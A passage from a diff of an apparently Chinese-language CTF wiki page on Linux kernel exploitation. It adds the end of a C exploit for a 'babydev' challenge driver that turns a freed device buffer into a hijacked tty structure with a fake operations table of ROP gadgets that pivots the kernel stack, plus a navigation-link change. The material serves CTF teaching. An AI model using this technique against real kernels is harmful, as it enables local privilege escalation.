+        <span class="n">fake_tty_operations</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8181BFC5</span><span class="p">;</span> 
+    <span class="p">}</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810635f5</span><span class="p">;</span>  <span class="c1">//pop rax; pop rbp; ret;</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">rop</span><span class="p">;</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8181BFC5</span><span class="p">;</span>  <span class="c1">// mov rsp,rax ; dec ebx ; ret</span>
+
+    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/babydev&quot;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/babydev&quot;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mh">0x10001</span><span class="p">,</span> <span class="mh">0x2e0</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">fd_tty</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/ptmx&quot;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_NOCTTY</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="n">fake_tty_struct</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+    <span class="n">fake_tty_struct</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">fake_tty_operations</span><span class="p">;</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span><span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd_tty</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div></p>
                 
                   
                 
@@ -4154,7 +4499,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../kernel_rop/" title="kernel-ROP" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../ret2usr/" title="ret2usr" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -4163,7 +4508,7 @@
                 <span class="md-footer-nav__direction">
                   后退
                 </span>
-                kernel-ROP
+                ret2usr
               </span>
             </div>
           </a>
